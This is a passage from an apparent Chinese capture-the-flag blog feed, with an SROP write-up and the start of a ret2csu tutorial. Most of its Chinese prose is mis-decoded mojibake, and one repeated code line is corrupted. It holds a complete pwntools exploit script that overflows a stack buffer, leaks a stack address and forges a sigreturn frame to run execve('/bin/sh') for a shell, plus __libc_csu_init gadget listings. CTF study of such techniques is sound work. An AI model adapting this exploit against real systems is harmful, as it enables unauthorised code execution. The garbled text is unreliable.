data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9hZHZhbmNlZC1yb3Avc3JvcC8jXzM=\">Â¶</span></h3>\n<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨æ„é€  ROP æ”»å‡»çš„æ—¶å€™ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶</p>\n<ul>\n<li><strong>å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶æ ˆçš„å†…å®¹</strong></li>\n<li>éœ€è¦çŸ¥é“ç›¸åº”çš„ **<u>åœ°å€</u>**\n<ul>\n<li><strong>&quot;/bin/sh&quot;</strong></li>\n<li><strong>Signal Frame</strong></li>\n<li><strong>syscall</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li>éœ€è¦æœ‰å¤Ÿå¤§çš„ç©ºé—´æ¥å¡ä¸‹æ•´ä¸ª sigal frame</li>\n</ul>\n<p>æ­¤å¤–ï¼Œå…³äº sigreturn ä»¥åŠ syscall;ret è¿™ä¸¤ä¸ª gadget åœ¨ä¸Šé¢å¹¶æ²¡æœ‰æåŠã€‚æå‡ºè¯¥æ”»å‡»çš„è®ºæ–‡ä½œè€…å‘ç°äº†è¿™äº› gadgets å‡ºç°çš„æŸäº›åœ°å€ï¼š</p>\n<h2 id=\"ä¸€é“ä¾‹é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€é“ä¾‹é¢˜\">#</a> ä¸€é“ä¾‹é¢˜</h2>\n<h3 id=\"æ£€æŸ¥\"><a class=\"markdownIt-Anchor\" href=\"#æ£€æŸ¥\">#</a> æ£€æŸ¥</h3>\n<p><img data-src=\"/img/srop/image-20230803220602093.png\" alt=\"image-20230803220602093\"></p>\n<p><img data-src=\"/img/srop/image-20230803220635434.png\" alt=\"image-20230803220635434\"></p>\n<p>å‘ç°è¾“å…¥å¾ˆå°‘å­—ç¬¦ï¼Œç¨‹åºå°±å´©æºƒã€‚å †æ ˆä¸å¯æ‰§è¡Œã€‚</p>\n<h3 id=\"ida\"><a class=\"markdownIt-Anchor\" href=\"#ida\">#</a> IDA</h3>\n<p><img data-src=\"/img/srop/image-20230803220825554.png\" alt=\"image-20230803220825554\"></p>\n<p><img data-src=\"/img/srop/image-20230803220903459.png\" alt=\"image-20230803220903459\"></p>\n<p><img data-src=\"/img/srop/image-20230803220926236.png\" alt=\"image-20230803220926236\"></p>\n<p>mian å‡½æ•°è¿›å…¥ vulnï¼Œå¾ˆå®¹æ˜“å‘ç° vuln å‡½æ•°è°ƒç”¨ sys_read å’Œ sys_write ç³»ç»Ÿè°ƒç”¨å‡½æ•°ã€‚å…¶ä¸­åœ¨ buf ä¸­æœ‰æ¼æ´ç‚¹ã€‚å¹¶å‘ç° gadgets ä¸­æœ‰</p>\n<pre><code class=\"language-commonlisp\"># 00000000004004DA                 mov     rax, 0Fh\n</code></pre>\n<p>æ‰€ä»¥å¾ˆæ˜æ˜¾å¯ä»¥è¿›è¡Œ sropã€‚</p>\n<p>srop è¾¾æˆæ”»å‡»çš„æ¡ä»¶æ˜¯ä¸€ä¸‹å†…å®¹ï¼š</p>\n<ul>\n<li><strong>å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶æ ˆçš„å†…å®¹</strong></li>\n<li>éœ€è¦çŸ¥é“ç›¸åº”çš„ **<u>åœ°å€</u>**\n<ul>\n<li><strong>&quot;/bin/sh&quot;</strong></li>\n<li><strong>Signal Frame</strong></li>\n<li><strong>syscall</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li>éœ€è¦æœ‰å¤Ÿå¤§çš„ç©ºé—´æ¥å¡ä¸‹æ•´ä¸ª sigal frame</li>\n</ul>\n<p>æ£€æŸ¥å­—ç¬¦ä¸²å¹¶æ²¡æœ‰ binshï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ sys_read è¯»å…¥ï¼Œå»æ³„éœ²æ ˆçš„åŸºå€ï¼Œç„¶åå»è®¡ç®— binsh åœ¨æ ˆä¸­çš„åç§»ã€‚å› ä¸ºè™½ç„¶ç¨‹åºè¿œç¨‹å’Œæœ¬åœ°åŠ è½½ä¸åŒï¼Œä½†æ˜¯ bin/sh è¯»å…¥çš„åç§»æ˜¯ç›¸åŒçš„ã€‚æ ¹æ®è¿™ä¸ªåŸç†ï¼Œæˆ‘ä»¬å»è®¡ç®—æœ¬åœ°è°ƒè¯•çš„ /bin/sh çš„åç§»</p>\n<p>ä½†è¿™é¢˜æˆ‘ä»¬å¹¶ä¸çŸ¥çš„å»å¦‚ä½•æ³„éœ²æ ˆçš„åŸºå€ï¼Œé‚£è¯¥å’‹åŠã€‚å‡¡äº‹å…ˆè°ƒè¯•å†è¯´ã€‚</p>\n<p>main å‡½æ•°ä¹‹å‰è®°å½• rsi</p>\n<p><img data-src=\"/img/srop/image-20230803222622304.png\" alt=\"image-20230803222622304\"></p>\n<p>è¾“å…¥ /bin/sh è®°å½• rsi</p>\n<p><img data-src=\"/img/srop/image-20230803222733528.png\" alt=\"image-20230803222733528\"></p>\n<p>ä» rsi ä¸­ï¼Œæˆ‘ä»¬èƒ½å¾—åˆ° bin/sh åœ¨æ ˆä¸­çš„åç§» â€”â€” 0x7fffffffddf8 - 0x7fffffffdce0</p>\n<p><img data-src=\"/img/srop/image-20230803223305868.png\" alt=\"image-20230803223305868\"></p>\n<p>ä»è¿™é‡Œæˆ‘ä»¬å°±èƒ½å‘ç° â€”â€”write æ‰“å°å‡º 0x30 ä¸ªå­—èŠ‚ï¼Œå¯ä»¥çœ‹å‡ºä»ä½åœ°å€å¼€å§‹æ‰“å° 0x20 ä¸ªå­—èŠ‚å 0x8 å°±æ˜¯æ ˆåŸºå€</p>\n<p>æ‰€ä»¥é€šè¿‡ write å‡½æ•°èƒ½æ‰“å°å‡º libc æ ˆåŸºå€</p>\n<p>æ‰“å°å®Œæ ˆåŸºå€æˆ‘ä»¬å°±èƒ½é€šè¿‡åç§»è®¡ç®—å‡º binsh çš„åŸºå€äº†ã€‚</p>\n<p>æ€è·¯æœ‰äº†ï¼Œç›´æ¥ä¸Š exp</p>\n<h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#r = remote('node2.anna.nssctf.cn',28450)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r <span class=\"token operator\">=</span> gdb<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">'./PWN3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./PWN3')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># libc = ELF('/home/f145h/Desktop/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./PWN3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #è®¾ç½®ç§å­</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'F145H'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>vuln <span class=\"token operator\">=</span> <span class=\"token number\">0x4004ED</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ä¼ è¾“/bin/shä¹‹å‰======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ä¼ è¾“/bin/shä¹‹å======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>of <span class=\"token operator\">=</span> <span class=\"token number\">0x7fffffffde28</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7fffffffdd10</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token string\">'of è®¡ç®—binshåœ¨æ ˆçš„åç§»'</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>l_stack <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>binsh <span class=\"token operator\">=</span> l_stack <span class=\"token operator\">-</span> of</pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>l_stack<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'binsh_addr=======>'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>syscall <span class=\"token operator\">=</span> <span class=\"token number\">0x400501</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\"># 00000000004004DA                 mov     rax, 0Fh</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>sigreturn  <span class=\"token operator\">=</span> <span class=\"token number\">0x4004DA</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binsh </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sigreturn<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframe<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ä¼ è¾“sigframeä¹‹å‰======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ä¼ è¾“sigframeä¹‹å======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>éœ€è¦è®¾ç½®æ¶æ„</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>execve:</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tsigframe = SigreturnFrame()</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\tsigframe.rax = constants.SYS_execve</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tsigframe.rdi = binsh </pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\tsigframe.rsi = 0x0</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tsigframe.rip = syscall</pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>read:</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tframe =  SigreturnFrame()</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\tframe.rax = constants.SYS_read</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\tframe.rdi = 0</pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tframe.rsi = stack_addr</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tframe.rdx = 0x400</pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\tframe.rsp = stack_addr</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\tframe.rip = syscall_addr</pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>x64 more information:</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\thttp://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binsh </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sigreturn<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframï¼‰</pre></td></tr></table></figure><p>å½“ä¼ å…¥ pl2 æˆ‘ä»¬è°ƒè¯•å‘ç°å¯„å­˜å™¨çš„å˜åŒ–</p>\n<p>å¯è§ srop çš„æ”»å‡»åŸç†</p>\n<p><img data-src=\"/img/srop/image-20230803224211151.png\" alt=\"\"></p>\n<p><img data-src=\"/img/srop/image-20230803224917202.png\" alt=\"image-20230803224917202\"></p>\n<p><img data-src=\"/img/srop/image-20230803224304825.png\" alt=\"image-20230803224304825\"></p>\n",
            "tags": [
                "rop",
                "srop"
            ]
        },
        {
            "id": "http://example.com/2023/08/03/csu/",
            "url": "http://example.com/2023/08/03/csu/",
            "title": "csu",
            "date_published": "2023-08-03T11:47:18.000Z",
            "content_html": "<h1 id=\"ä¸­çº§rop_csu\"><a class=\"markdownIt-Anchor\" href=\"#ä¸­çº§rop_csu\">#</a> ä¸­çº§ ROP_CSU</h1>\n<p><strong>ret2csu</strong> æ³„éœ² libc åœ°å€ä¹‹ååˆ©ç”¨ libc ä¸­çš„ gadget getshell. <strong>ret2csu</strong> é…åˆ pop rax; syscall; ç­‰ gadget ç›´æ¥ GetShell. å¼€å¯ PIE çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ offset2lib è¿›è¡Œ<strong> ret2csu</strong>, æˆ–è€…ç›´æ¥åˆ©ç”¨ libc ä¸­çš„ gadget getshell.</p>\n<p>åªè¦åŠ¨æ€è¿æ¥éƒ½ä¼šæœ‰ _libc_csu_init å‡½æ•°</p>\n<h3 id=\"åŸç†\"><a class=\"markdownIt-Anchor\" href=\"#åŸç†\">#</a> åŸç† <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9tZWRpdW0tcm9wLyNfMQ==\">Â¶</span></h3>\n<p>åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰ 6 ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„ gadgetsã€‚ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ x64 ä¸‹çš„ __libc_csu_init ä¸­çš„ gadgetsã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¯¹ libc è¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨ libc å‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•° (å½“ç„¶ï¼Œä¸åŒç‰ˆæœ¬çš„è¿™ä¸ªå‡½æ•°æœ‰ä¸€å®šçš„åŒºåˆ«)</p>\n<p>gadget1_å…ˆæ‰§è¡Œ</p>\n<ul>\n<li>ä» 0x000000000040061A ä¸€ç›´åˆ°ç»“å°¾ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ„é€ æ ˆä¸Šæ•°æ®æ¥æ§åˆ¶ rbx,rbp,r12,r13,r14,r15 å¯„å­˜å™¨çš„æ•°æ®ã€‚</li>\n</ul>\n<pre><code class=\"language-Python\">.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n.text:0000000000400624 __libc_csu_init endp\n</code></pre>\n<p>æˆ‘ä»¬é€šå¸¸ä¼šæŠŠ rbx çš„å€¼è®¾ç½®æˆ 0ï¼Œè€Œ rbp è®¾ç½®æˆ 1. è¿™æ ·çš„ç›®çš„æ˜¯åœ¨æ‰§è¡Œ call qword ptr [r12+rbx*8] è¿™ä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä»…ä»…æŠŠ r12 çš„å€¼ç»™è®¾ç½®æˆæŒ‡å‘æˆ‘ä»¬æƒ³ call åœ°å€çš„åœ°å€å³å¯ï¼Œä»è€Œä¸ç”¨ç®¡ rbxã€‚</p>\n<p>åˆå› ä¸ºè¿™ä¸‰ä¸ªæŒ‡ä»¤ add rbx,ï¼›cmp rbx, rbpï¼›jnz short loc_400600ï¼Œjnz æ˜¯ä¸ç›¸ç­‰æ—¶è·³è½¬ï¼Œæˆ‘ä»¬é€šå¸¸å¹¶ä¸æƒ³è·³è½¬åˆ° 0x400580 è¿™ä¸ªåœ°æ–¹ï¼Œå› ä¸ºæ­¤åˆ»æ‰§è¡Œè¿™ä¸‰ä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±æ˜¯ä» 0x400600 è¿™ä¸ªåœ°å€è¿‡æ¥çš„ã€‚å› æ­¤ rbx åŠ ä¸€ä¹‹åï¼Œæˆ‘ä»¬è¦è®©å®ƒå’Œ rbp ç›¸ç­‰ï¼Œå› æ­¤ rbp å°±è¦æå‰è¢«è®¾ç½®æˆ 1.</p>\n<p>ç„¶å<strong> r12 è¦å­˜æ”¾çš„å°±æ˜¯æŒ‡å‘ï¼ˆæˆ‘ä»¬è¦è·³è½¬åˆ°é‚£ä¸ªåœ°å€ï¼‰çš„åœ°å€</strong>ã€‚è¿™é‡Œæœ‰ä¸ªå¾ˆé‡è¦çš„å°æŠ€å·§ï¼Œå¦‚æœä½ ä¸æƒ³ä½¿ç”¨è¿™ä¸ª callï¼Œæˆ–è€…è¯´ä½ æƒ³ call ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯ä½ æ‹¿ä¸åˆ°å®ƒçš„ got åœ°å€ï¼Œå› æ­¤æ²¡æ³•ä½¿ç”¨è¿™ä¸ª callï¼Œé‚£å°±å» call ä¸€ä¸ªç©ºå‡½æ•°ï¼ˆ_term_proc å‡½æ•°ï¼‰ï¼ˆå¹¶ä¸”è¦æ³¨æ„çš„æ˜¯ï¼Œr12 çš„åœ°å€å¡«å†™çš„å¹¶ä¸æ˜¯_term_proc çš„åœ°å€ï¼Œè€Œæ˜¯æŒ‡å‘è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼‰ã€‚</p>\n<p>ç„¶å r13,r14,r15 è¿™ä¸‰ä¸ªå€¼åˆ†åˆ«å¯¹åº”äº† rdx,rsi,ediã€‚è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œr15 æœ€åä¼ ç»™çš„æ˜¯ edi, æœ€å rdi 